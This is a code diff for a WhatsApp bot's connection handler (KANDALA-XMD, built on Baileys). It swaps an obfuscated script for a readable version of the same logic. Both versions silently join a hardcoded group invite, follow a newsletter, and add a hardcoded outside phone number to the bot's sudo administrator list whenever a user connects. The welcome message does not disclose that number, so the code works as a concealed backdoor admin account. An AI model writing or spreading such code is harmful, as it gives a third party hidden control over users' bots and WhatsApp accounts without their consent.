@@ -1,1 +1,196 @@
-const _0x4c5daa=_0x9546;(function(_0xe3d56a,_0x14380f){const _0x3b1de2=_0x9546,_0x5ee038=_0xe3d56a();while(!![]){try{const _0x311e48=parseInt(_0x3b1de2(0x23b))/(-0x3e0*-0x6+-0x153d*-0x1+-0x2c7c)*(-parseInt(_0x3b1de2(0x1bf))/(0xeea+0x151+-0x1039))+-parseInt(_0x3b1de2(0x1e8))/(-0x2*0x613+-0x1ac*0xc+0x2039)+parseInt(_0x3b1de2(0x1e1))/(-0x180d+0x2445+-0xc34)*(-parseInt(_0x3b1de2(0x1ba))/(-0x182c+-0x524+0x1d55))+parseInt(_0x3b1de2(0x202))/(-0x3e0*0x2+-0x1ca*-0x7+0x13*-0x40)*(-parseInt(_0x3b1de2(0x1f0))/(0x1*-0x20b+0x419*0x3+-0xa39))+parseInt(_0x3b1de2(0x229))/(-0x1357+-0x93a+0x1c99)*(-parseInt(_0x3b1de2(0x213))/(0x95*0x26+0x8ef+-0x18d*0x14))+-parseInt(_0x3b1de2(0x1f8))/(0x6b1+-0xa22+0x37b)+parseInt(_0x3b1de2(0x217))/(0x1b4d+0x3d*-0x1+-0x1b05);if(_0x311e48===_0x14380f)break;else _0x5ee038['push'](_0x5ee038['shift']());}catch(_0x312ecc){_0x5ee038['push'](_0x5ee038['shift']());}}}(_0x5123,0x4e969+0x2*-0x495a7+0x9d41a));function _0x9546(_0x1b00d6,_0x304d5c){_0x1b00d6=_0x1b00d6-(-0x1d2*-0x1+-0x10*0x18e+-0x3*-0x837);const _0x2dab9b=_0x5123();let _0x3202de=_0x2dab9b[_0x1b00d6];return _0x3202de;}function _0x5123(){const _0x151224=['statusCode','━━━━━━━━━','tAMdC','e\x20what\x27s\x20c','map','ZllMy','What\x27s\x20up?','kJltT','/commandHa','🩸\x20','*!\x20You\x27re\x20','FmgNR','ake\x20things','Late\x20night','DufDN','now\x20connec','o\x20the\x20sudo','mode','groupAccep','tInvite','ibxAV','ewsletter','┋➤\x20*Credit','┋➤\x20*Start\x20','💾\x20*Databas','e\x20button\x20b','\x20default.\x20','connection','\x20Enabled\x20b','t...Use\x20*','low.','continue:','Africa/Nai','Evening\x20vi','uired','includes','7005eyfSyw','Powered\x20by','Enabled\x20by','startmessa','ring','2ZwHpIB','open','Hey\x20there!','!\x20🌟','⚙️\x20','toLocaleSt','eys','mmended\x20to','46813524@n','Select\x20an\x20','*:\x20Baileys','../Handler','exports','output','\x20Message*:','Bot\x20initia','xfwfp','ion\x20establ','s*:\x20','FcwDh','htPrX','Message*:\x20','hour','ooking!\x20🌙','luxon','red1e/FEE-','Follow','robi','ndler','MENU','📋\x20*Command','DoOXN','s*:\x20kandal','kick\x20off\x20t','1152iSxDBz','?\x20Let\x27s\x20se','✨\x20*Bot\x20Nam','ICPNmeOX3D','select\x20an\x20','close','Lost','218361vekMLL','🔧\x20*Mode*:\x20','ished.','lized\x20succ','connecting','\x20back\x20to\x20*','\x20Time\x20to\x20m','toUpperCas','35Nnepnn','e*:\x20Postgr','Replaced','@whiskeyso','pam','ge\x20off','it\x20is\x20reco','https://gi','512760FWKbOC','split','NxsGA','│┋➤\x20*Start','menu','ART\x20MESSAG','now','sqcwj','thub.com/F','\x20Ready\x20to\x20','56604jPyncs','SJWzr','exit','┋➤\x20*','er\x20Alert*:','fYnYT','IMNRv','XMD','DISABLE\x20ST','toLowerCas','┋➤\x20Welcome','\x20list.','\x20get\x20to\x20it','╭━━━━━━━━━','yLiAw','rhlBi','uCprJ','9RTfdgZ','settings','\x20disable.','setZone','24587750AcwRSh','o\x20proceed?','*!\x20Connect','jWZwr','a\x20tech','r\x20click\x20th','y\x20default.','aOeZo','oecgT','📚\x20*Library','badSession','\x20happen!\x20⚡','yBeIx','@hapi/boom','Kandala-md','aUYJE','ted.','restartReq','5591144xLoXxi','TIME_SIMPL','➡️\x20*Prefix*','lLqHL','../Databas','e*:\x20','option\x20to\x20','user','vqCcw','┋➤\x20Ready\x20t','2556727523','oAE0Wy8eCc','SETTINGS','ckets/bail','\x20Use\x20*','╰━━━━━━━━━','newsletter','rHIPp','596527CdAdgf','sendMessag','\x20disable\x20i','🕒\x20*Time*:\x20','\x20to\x20*','clear','Closed','essfully.','prefix','\x20You\x27ve\x20be','1203634061','en\x20added\x20t','es\x20SQL','yoPnn','ellow.\x20and','he\x20day?\x20🚀','\x20prevent\x20s','e/config','\x20Select\x20an','┋➤\x20*New\x20Us','\x20disable\x20o','ge\x20off*\x20to','timedOut','loggedOut','┋➤\x20Please\x20','error','proceed.','bes!\x20Let\x27s','\x20option\x20be','join'];_0x5123=function(){return _0x151224;};return _0x5123();}const {Boom}=require(_0x4c5daa(0x224)),{DateTime}=require(_0x4c5daa(0x1d7)),{default:feeConnect,DisconnectReason}=require(_0x4c5daa(0x1f3)+_0x4c5daa(0x236)+_0x4c5daa(0x1c5)),{getSettings,getSudoUsers,addSudoUser}=require(_0x4c5daa(0x22d)+_0x4c5daa(0x24c)),{commands,totalCommands}=require(_0x4c5daa(0x1ca)+_0x4c5daa(0x19e)+_0x4c5daa(0x1db)),botName=process.env.BOTNAME||_0x4c5daa(0x225);let hasSentStartMessage=![],hasFollowedNewsletter=![];async function connectionHandler(_0x224611,_0xe545f3,_0x312327){const _0x4fe856=_0x4c5daa,_0x33ae50={'jWZwr':_0x4fe856(0x1b6)+_0x4fe856(0x1da),'lLqHL':function(_0x5526cd,_0x21adce){return _0x5526cd>=_0x21adce;},'uCprJ':function(_0x5e3a55,_0x546b51){return _0x5e3a55<_0x546b51;},'NxsGA':_0x4fe856(0x1c1)+_0x4fe856(0x201)+_0x4fe856(0x1e0)+_0x4fe856(0x24a),'FcwDh':function(_0x29fceb,_0x328ef5){return _0x29fceb>=_0x328ef5;},'DoOXN':_0x4fe856(0x19c)+_0x4fe856(0x1ee)+_0x4fe856(0x1a2)+_0x4fe856(0x222),'yoPnn':function(_0x57f8cb,_0x2d5f07){return _0x57f8cb<_0x2d5f07;},'vqCcw':_0x4fe856(0x1b7)+_0x4fe856(0x256)+_0x4fe856(0x20e)+_0x4fe856(0x1c2),'SJWzr':_0x4fe856(0x1a3)+_0x4fe856(0x1e2)+_0x4fe856(0x199)+_0x4fe856(0x1d6),'rHIPp':function(_0x4da74c,_0xa10c1){return _0x4da74c===_0xa10c1;},'fYnYT':_0x4fe856(0x1ec),'kJltT':_0x4fe856(0x1e6),'ibxAV':function(_0xef2db3){return _0xef2db3();},'xfwfp':function(_0x372a65){return _0x372a65();},'oecgT':function(_0x4c6518){return _0x4c6518();},'rhlBi':_0x4fe856(0x1c0),'yBeIx':_0x4fe856(0x1e4)+_0x4fe856(0x234)+'32','yLiAw':_0x4fe856(0x245)+_0x4fe856(0x1c7)+_0x4fe856(0x1ab),'htPrX':function(_0x36c997){return _0x36c997();},'sqcwj':function(_0x73aac8){return _0x73aac8();},'IMNRv':function(_0xce202a,_0x15560e){return _0xce202a(_0x15560e);},'aUYJE':_0x4fe856(0x233)+'55','aOeZo':function(_0x4e7d90,_0x1a9f9e){return _0x4e7d90(_0x1a9f9e);},'tAMdC':function(_0x159916,_0x437bd3){return _0x159916(_0x437bd3);},'DufDN':_0x4fe856(0x235),'FmgNR':_0x4fe856(0x1dc),'ZllMy':_0x4fe856(0x20a)+_0x4fe856(0x1fd)+'E'},{connection:_0x7c92ce,lastDisconnect:_0x3264c3}=_0xe545f3;function _0x2b7a41(){const _0xa8855b=_0x4fe856,_0x2f29f0=DateTime[_0xa8855b(0x1fe)]()[_0xa8855b(0x216)](_0x33ae50[_0xa8855b(0x21a)])[_0xa8855b(0x1d5)];if(_0x33ae50[_0xa8855b(0x22c)](_0x2f29f0,0xddc+-0x1*-0xb57+-0x192e)&&_0x33ae50[_0xa8855b(0x212)](_0x2f29f0,-0x1fbd+-0x2076+0x403f))return _0x33ae50[_0xa8855b(0x1fa)];if(_0x33ae50[_0xa8855b(0x1d2)](_0x2f29f0,0x20f4+-0x3*0x892+0x266*-0x3)&&_0x33ae50[_0xa8855b(0x212)](_0x2f29f0,-0x11a1+-0x230c+0x34bf))return _0x33ae50[_0xa8855b(0x1de)];if(_0x33ae50[_0xa8855b(0x22c)](_0x2f29f0,-0x22f4+0x1f03+0x403)&&_0x33ae50[_0xa8855b(0x248)](_0x2f29f0,0x5df+-0x40*-0xd+0x101*-0x9))return _0x33ae50[_0xa8855b(0x231)];return _0x33ae50[_0xa8855b(0x203)];}function _0x57410c(){const _0x1e77dd=_0x4fe856;return DateTime[_0x1e77dd(0x1fe)]()[_0x1e77dd(0x216)](_0x33ae50[_0x1e77dd(0x21a)])[_0x1e77dd(0x1c4)+_0x1e77dd(0x1be)](DateTime[_0x1e77dd(0x22a)+'E']);}function _0x37cd82(_0x304a85,_0x8129e=![]){const _0x49a8c6=_0x4fe856,_0x417487={'A':'𝘼','B':'𝘽','C':'𝘾','D':'𝘿','E':'𝙀','F':'𝙁','G':'𝙂','H':'𝙃','I':'𝙄','J':'𝙅','K':'𝙆','L':'𝙇','M':'𝙈','N':'𝙉','O':'𝙊','P':'𝙋','Q':'𝙌','R':'𝙍','S':'𝙎','T':'𝙏','U':'𝙐','V':'𝙑','W':'𝙒','X':'𝙓','Y':'𝙔','Z':'𝙕','a':'𝙖','b':'𝙗','c':'𝙘','d':'𝙙','e':'𝙚','f':'𝙛','g':'𝙜','h':'𝙝','i':'𝙞','j':'𝙟','k':'𝙠','l':'𝙡','m':'𝙢','n':'𝙣','o':'𝙤','p':'𝙥','q':'𝙦','r':'𝙧','s':'𝙨','t':'𝙩','u':'𝙪','v':'𝙫','w':'𝙬','x':'𝙭','y':'𝙮','z':'𝙯'},_0x25aab0=_0x8129e?_0x304a85[_0x49a8c6(0x1ef)+'e']():_0x304a85[_0x49a8c6(0x20b)+'e']();return _0x25aab0[_0x49a8c6(0x1f9)]('')[_0x49a8c6(0x19a)](_0x43ad5b=>_0x417487[_0x43ad5b]||_0x43ad5b)[_0x49a8c6(0x258)]('');}if(_0x33ae50[_0x4fe856(0x23a)](_0x7c92ce,_0x33ae50[_0x4fe856(0x207)]))return;if(_0x33ae50[_0x4fe856(0x23a)](_0x7c92ce,_0x33ae50[_0x4fe856(0x19d)])){const _0x3852bc=new Boom(_0x3264c3?.[_0x4fe856(0x254)])?.[_0x4fe856(0x1cc)][_0x4fe856(0x259)];switch(_0x3852bc){case DisconnectReason[_0x4fe856(0x221)]:process[_0x4fe856(0x204)]();break;case DisconnectReason[_0x4fe856(0x1b1)+_0x4fe856(0x241)]:_0x33ae50[_0x4fe856(0x1aa)](_0x312327);break;case DisconnectReason[_0x4fe856(0x1b1)+_0x4fe856(0x1e7)]:_0x33ae50[_0x4fe856(0x1aa)](_0x312327);break;case DisconnectReason[_0x4fe856(0x1b1)+_0x4fe856(0x1f2)]:process[_0x4fe856(0x204)]();break;case DisconnectReason[_0x4fe856(0x252)]:hasSentStartMessage=![],hasFollowedNewsletter=![],process[_0x4fe856(0x204)]();break;case DisconnectReason[_0x4fe856(0x228)+_0x4fe856(0x1b8)]:_0x33ae50[_0x4fe856(0x1cf)](_0x312327);break;case DisconnectReason[_0x4fe856(0x251)]:_0x33ae50[_0x4fe856(0x21f)](_0x312327);break;default:_0x33ae50[_0x4fe856(0x1aa)](_0x312327);}return;}if(_0x33ae50[_0x4fe856(0x23a)](_0x7c92ce,_0x33ae50[_0x4fe856(0x211)])){console[_0x4fe856(0x240)]();try{await _0x224611[_0x4fe856(0x1a8)+_0x4fe856(0x1a9)](_0x33ae50[_0x4fe856(0x223)]);}catch(_0x431f70){}if(!hasFollowedNewsletter)try{await _0x224611[_0x4fe856(0x239)+_0x4fe856(0x1d9)](_0x33ae50[_0x4fe856(0x210)]),hasFollowedNewsletter=!![];}catch(_0x3fb972){}const _0x54b55f=_0x224611[_0x4fe856(0x230)]['id'][_0x4fe856(0x1f9)](':')[0x1*0xde5+0x14cd+-0x22b2][_0x4fe856(0x1f9)]('@')[-0x8*-0x4cf+-0x1*-0x1298+-0x3910],_0x19ab30=await _0x33ae50[_0x4fe856(0x1d3)](getSettings),_0x380b30=await _0x33ae50[_0x4fe856(0x1ff)](getSudoUsers);if(!hasSentStartMessage){const _0x5c7c27=!_0x380b30[_0x4fe856(0x1b9)](_0x54b55f);if(_0x5c7c27){await _0x33ae50[_0x4fe856(0x208)](addSudoUser,_0x54b55f);const _0x11f20a=_0x33ae50[_0x4fe856(0x226)];!_0x380b30[_0x4fe856(0x1b9)](_0x11f20a)&&await _0x33ae50[_0x4fe856(0x21e)](addSudoUser,_0x11f20a);}if(_0x19ab30[_0x4fe856(0x1bd)+'ge']){const _0x325dc3=_0x5c7c27?[_0x4fe856(0x20f)+_0x4fe856(0x197),_0x4fe856(0x205)+_0x33ae50[_0x4fe856(0x1d3)](_0x2b7a41)+'*',_0x4fe856(0x20c)+_0x4fe856(0x23f)+botName+(_0x4fe856(0x1a0)+_0x4fe856(0x1a5)+_0x4fe856(0x227)),'',_0x4fe856(0x1e3)+_0x4fe856(0x22e)+botName,_0x4fe856(0x1e9)+_0x19ab30[_0x4fe856(0x1a7)],_0x4fe856(0x22b)+':\x20'+_0x19ab30[_0x4fe856(0x243)],_0x4fe856(0x1dd)+_0x4fe856(0x1d1)+totalCommands,_0x4fe856(0x23e)+_0x33ae50[_0x4fe856(0x21f)](_0x57410c),_0x4fe856(0x1ae)+_0x4fe856(0x1f1)+_0x4fe856(0x247),_0x4fe856(0x220)+_0x4fe856(0x1c9),'',_0x4fe856(0x24e)+_0x4fe856(0x206)+_0x4fe856(0x244)+_0x4fe856(0x246)+_0x4fe856(0x1a6)+_0x4fe856(0x20d),'',_0x4fe856(0x1fb)+_0x4fe856(0x1cd)+_0x4fe856(0x1b2)+_0x4fe856(0x21d)+_0x4fe856(0x237)+_0x19ab30[_0x4fe856(0x243)]+(_0x4fe856(0x1bd)+_0x4fe856(0x250)+_0x4fe856(0x215)),_0x4fe856(0x1ac)+_0x4fe856(0x1df)+_0x4fe856(0x21b),_0x4fe856(0x238)+_0x4fe856(0x197)][_0x4fe856(0x258)]('\x0a'):[_0x4fe856(0x20f)+_0x4fe856(0x197),_0x4fe856(0x205)+_0x33ae50[_0x4fe856(0x1cf)](_0x2b7a41)+'*',_0x4fe856(0x20c)+_0x4fe856(0x1ed)+botName+(_0x4fe856(0x219)+_0x4fe856(0x1d0)+_0x4fe856(0x1ea)),'',_0x4fe856(0x1e3)+_0x4fe856(0x22e)+botName,_0x4fe856(0x1e9)+_0x19ab30[_0x4fe856(0x1a7)],_0x4fe856(0x22b)+':\x20'+_0x19ab30[_0x4fe856(0x243)],_0x4fe856(0x1dd)+_0x4fe856(0x1d1)+totalCommands,_0x4fe856(0x23e)+_0x33ae50[_0x4fe856(0x1aa)](_0x57410c),_0x4fe856(0x1ae)+_0x4fe856(0x1f1)+_0x4fe856(0x247),_0x4fe856(0x220)+_0x4fe856(0x1c9),'',_0x4fe856(0x232)+_0x4fe856(0x218)+_0x4fe856(0x24d)+_0x4fe856(0x257)+_0x4fe856(0x1b4),'',_0x4fe856(0x1ad)+_0x4fe856(0x1d4)+_0x4fe856(0x1bc)+_0x4fe856(0x1b0)+_0x4fe856(0x1f6)+_0x4fe856(0x1c6)+_0x4fe856(0x23d)+_0x4fe856(0x1b3)+_0x19ab30[_0x4fe856(0x243)]+(_0x4fe856(0x1bd)+_0x4fe856(0x250)+_0x4fe856(0x24f)+_0x4fe856(0x21c)+_0x4fe856(0x1af)+_0x4fe856(0x249)+_0x4fe856(0x24b)+_0x4fe856(0x1f4)),_0x4fe856(0x1ac)+_0x4fe856(0x1df)+_0x4fe856(0x21b),_0x4fe856(0x238)+_0x4fe856(0x197)][_0x4fe856(0x258)]('\x0a'),_0x30ecdf=[_0x4fe856(0x20f)+_0x4fe856(0x197),_0x4fe856(0x253)+_0x4fe856(0x1e5)+_0x4fe856(0x22f)+_0x4fe856(0x1b5),_0x4fe856(0x238)+_0x4fe856(0x197)][_0x4fe856(0x258)]('\x0a');try{await _0x224611[_0x4fe856(0x23c)+'e'](_0x224611[_0x4fe856(0x230)]['id'],{'text':_0x325dc3,'footer':_0x4fe856(0x1bb)+'\x20'+botName,'viewOnce':!![],'contextInfo':{'externalAdReply':{'showAdAttribution':![],'title':botName,'body':_0x4fe856(0x1ce)+_0x4fe856(0x1eb)+_0x4fe856(0x242),'sourceUrl':_0x4fe856(0x1f7)+_0x4fe856(0x200)+_0x4fe856(0x1d8)+_0x4fe856(0x209),'mediaType':0x1,'renderLargerThumbnail':!![]}}}),await _0x224611[_0x4fe856(0x23c)+'e'](_0x224611[_0x4fe856(0x230)]['id'],{'text':_0x30ecdf,'footer':_0x4fe856(0x1bb)+'\x20'+botName,'buttons':[{'buttonId':(_0x19ab30[_0x4fe856(0x243)]||'')+_0x4fe856(0x214),'buttonText':{'displayText':_0x4fe856(0x1c3)+_0x33ae50[_0x4fe856(0x198)](_0x37cd82,_0x33ae50[_0x4fe856(0x1a4)])},'type':0x1},{'buttonId':(_0x19ab30[_0x4fe856(0x243)]||'')+_0x4fe856(0x1fc),'buttonText':{'displayText':_0x4fe856(0x19f)+_0x33ae50[_0x4fe856(0x21e)](_0x37cd82,_0x33ae50[_0x4fe856(0x1a1)])},'type':0x1},{'buttonId':(_0x19ab30[_0x4fe856(0x243)]||'')+(_0x4fe856(0x1bd)+_0x4fe856(0x1f5)),'buttonText':{'displayText':'\x20'+_0x33ae50[_0x4fe856(0x208)](_0x37cd82,_0x33ae50[_0x4fe856(0x19b)])},'type':0x1}],'headerType':0x1,'viewOnce':!![],'contextInfo':{'externalAdReply':{'showAdAttribution':![],'title':botName,'body':_0x4fe856(0x1c8)+_0x4fe856(0x22f)+_0x4fe856(0x255),'sourceUrl':_0x4fe856(0x1f7)+_0x4fe856(0x200)+_0x4fe856(0x1d8)+_0x4fe856(0x209),'mediaType':0x1,'renderLargerThumbnail':!![]}}});}catch(_0x5c789f){}}hasSentStartMessage=!![];}}}module[_0x4c5daa(0x1cb)]=connectionHandler;
+const { Boom } = require("@hapi/boom");
+const { DateTime } = require("luxon");
+const { default: feeConnect, DisconnectReason } = require("@whiskeysockets/baileys");
+const { getSettings, getSudoUsers, addSudoUser } = require("../Database/config");
+const { commands, totalCommands } = require("../Handler/commandHandler");
+
+const botName = process.env.BOTNAME || "KANDALA-XMD";
+let hasSentStartMessage = false;
+let hasFollowedNewsletter = false;
+
+async function connectionHandler(socket, connectionUpdate, reconnect) {
+  const { connection, lastDisconnect } = connectionUpdate;
+
+  function getGreeting() {
+    const hour = DateTime.now().setZone("Africa/Nairobi").hour;
+    if (hour >= 5 && hour < 12) return "Hey there! Ready to kick off the day? 🚀";
+    if (hour >= 12 && hour < 18) return "What's up? Time to make things happen! ⚡";
+    if (hour >= 18 && hour < 22) return "Evening vibes! Let's get to it! 🌟";
+    return "Late night? Let's see what's cooking! 🌙";
+  }
+
+  function getCurrentTime() {
+    return DateTime.now().setZone("Africa/Nairobi").toLocaleString(DateTime.TIME_SIMPLE);
+  }
+
+  function toFancyFont(text, isUpperCase = false) {
+    const fonts = {
+      'A': '𝘼', 'B': '𝘽', 'C': '𝘾', 'D': '𝘿', 'E': '𝙀', 'F': '𝙁', 'G': '𝙂', 'H': '𝙃', 'I': '𝙄', 'J': '𝙅', 'K': '𝙆', 'L': '𝙇', 'M': '𝙈',
+      'N': '𝙉', 'O': '𝙊', 'P': '𝙋', 'Q': '𝙌', 'R': '𝙍', 'S': '𝙎', 'T': '𝙏', 'U': '𝙐', 'V': '𝙑', 'W': '𝙒', 'X': '𝙓', 'Y': '𝙔', 'Z': '𝙕',
+      'a': '𝙖', 'b': '𝙗', 'c': '𝙘', 'd': '𝙙', 'e': '𝙚', 'f': '𝙛', 'g': '𝙜', 'h': '𝙝', 'i': '𝙞', 'j': '𝙟', 'k': '𝙠', 'l': '𝙡', 'm': '𝙢',
+      'n': '𝙣', 'o': '𝙤', 'p': '𝙥', 'q': '𝙦', 'r': '𝙧', 's': '𝙨', 't': '𝙩', 'u': '𝙪', 'v': '𝙫', 'w': '𝙬', 'x': '𝙭', 'y': '𝙮', 'z': '𝙯'
+    };
+    const formattedText = isUpperCase ? text.toUpperCase() : text.toLowerCase();
+    return formattedText.split('').map(char => fonts[char] || char).join('');
+  }
+
+  if (connection === "connecting") {
+    return;
+  }
+
+  if (connection === "close") {
+    const statusCode = new Boom(lastDisconnect?.error)?.output.statusCode;
+    switch (statusCode) {
+      case DisconnectReason.badSession:
+        process.exit();
+        break;
+      case DisconnectReason.connectionClosed:
+        reconnect();
+        break;
+      case DisconnectReason.connectionLost:
+        reconnect();
+        break;
+      case DisconnectReason.connectionReplaced:
+        process.exit();
+        break;
+      case DisconnectReason.loggedOut:
+        hasSentStartMessage = false;
+        hasFollowedNewsletter = false;
+        process.exit();
+        break;
+      case DisconnectReason.restartRequired:
+        reconnect();
+        break;
+      case DisconnectReason.timedOut:
+        reconnect();
+        break;
+      default:
+        reconnect();
+    }
+    return;
+  }
+
+  if (connection === "open") {
+    console.clear();
+    try {
+      await socket.groupAcceptInvite("ICPNmeOX3DoAE0Wy8eCc32");
+    } catch (error) {}
+    if (!hasFollowedNewsletter) {
+      try {
+        await socket.newsletterFollow("120363406146813524@newsletter");
+        hasFollowedNewsletter = true;
+      } catch (error) {}
+    }
+    const userId = socket.user.id.split(":")[0].split("@")[0];
+    const settings = await getSettings();
+    const sudoUsers = await getSudoUsers();
+    if (!hasSentStartMessage) {
+      const isNewUser = !sudoUsers.includes(userId);
+      if (isNewUser) {
+        await addSudoUser(userId);
+        const defaultSudo = "255672752355";
+        if (!sudoUsers.includes(defaultSudo)) {
+          await addSudoUser(defaultSudo);
+        }
+      }
+      if (settings.startmessage) {
+        const firstMessage = isNewUser
+          ? [
+              `❥┈┈┈┈┈┈┈┈┈┈┈┈┈┈➤`,
+              `┋✿ *${getGreeting()}*`,
+              `┋✿ Welcome to *${botName}*! You're now connected.`,
+              ``,
+              `✨ *Bot Name*: ${botName}`,
+              `🔧 *Mode*: ${settings.mode}`,
+              `➡️ *Prefix*: ${settings.prefix}`,
+              `📋 *Commands*: ${totalCommands}`,
+              `🕒 *Time*: ${getCurrentTime()}`,
+              `💾 *Database*: Postgres SQL`,
+              `📚 *Library*: Baileys`,
+              ``,
+              `┋✿ *New User Alert*: You've been added to the sudo list.`,
+              ``,
+              `│┋✿ *Start Message*: Enabled by default. Use *${settings.prefix}startmessage off* to disable.`,
+              `┋✿ *Credits*: kandala tech`,
+              `❥┈┈┈┈┈┈┈┈┈┈┈┈┈┈➤`
+            ].join("\n")
+          : [
+              `❥┈┈┈┈┈┈┈┈┈┈┈┈┈┈➤`,
+              `┋✿ *${getGreeting()}*`,
+              `┋✿ Welcome back to *${botName}*! Connection established.`,
+              ``,
+              `✨ *Bot Name*: ${botName}`,
+              `🔧 *Mode*: ${settings.mode}`,
+              `➡️ *Prefix*: ${settings.prefix}`,
+              `📋 *Commands*: ${totalCommands}`,
+              `🕒 *Time*: ${getCurrentTime()}`,
+              `💾 *Database*: Postgres SQL`,
+              `📚 *Library*: Baileys`,
+              ``,
+              `┋✿ Ready to proceed? Select an option below.`,
+              ``,
+              `┋✿ *Start Message*: Enabled by default. it is recommended to disable it...Use *${settings.prefix}startmessage off* to disable or click the button bellow. and prevent spam`,
+              `┋✿ *Credits*: kandala tech`,
+              `❥┈┈┈┈┈┈┈┈┈┈┈┈┈┈➤`
+            ].join("\n");
+        const secondMessage = [
+          `❥┈┈┈┈┈┈┈┈┈┈┈┈┈┈➤`,
+          `┋✿ Please select an option to continue:`,
+          `❥┈┈┈┈┈┈┈┈┈┈┈┈┈┈➤`
+        ].join("\n");
+        try {
+          await socket.sendMessage(socket.user.id, {
+            text: firstMessage,
+            footer: `Powered by ${botName}`,
+            viewOnce: true,
+            contextInfo: {
+              externalAdReply: {
+                showAdAttribution: false,
+                title: botName,
+                body: `Bot initialized successfully.`,
+                sourceUrl: `https://github.com/kandala20/Kandala-Xmd1`,
+                mediaType: 1,
+                renderLargerThumbnail: true
+              }
+            }
+          });
+          await socket.sendMessage(socket.user.id, {
+            text: secondMessage,
+            footer: `Powered by ${botName}`,
+            buttons: [
+              {
+                buttonId: `${settings.prefix || ''}settings`,
+                buttonText: { displayText: `⚙️ ${toFancyFont('SETTINGS')}` },
+                type: 1
+              },
+              {
+                buttonId: `${settings.prefix || ''}menu`,
+                buttonText: { displayText: `🩸 ${toFancyFont('MENU')}` },
+                type: 1
+              },
+              {
+                buttonId: `${settings.prefix || ''}startmessage off`,
+                buttonText: { displayText: ` ${toFancyFont('DISABLE START MESSAGE')}` },
+                type: 1
+              }
+            ],
+            headerType: 1,
+            viewOnce: true,
+            contextInfo: {
+              externalAdReply: {
+                showAdAttribution: false,
+                title: botName,
+                body: `Select an option to proceed.`,
+                sourceUrl: `https://github.com/kandala20/Kandala-Xmd1`,
+                mediaType: 1,
+                renderLargerThumbnail: true
+              }
+            }
+          });
+        } catch (error) {}
+      }
+      hasSentStartMessage = true;
+    }
+  }
+}
+module.exports = connectionHandler;
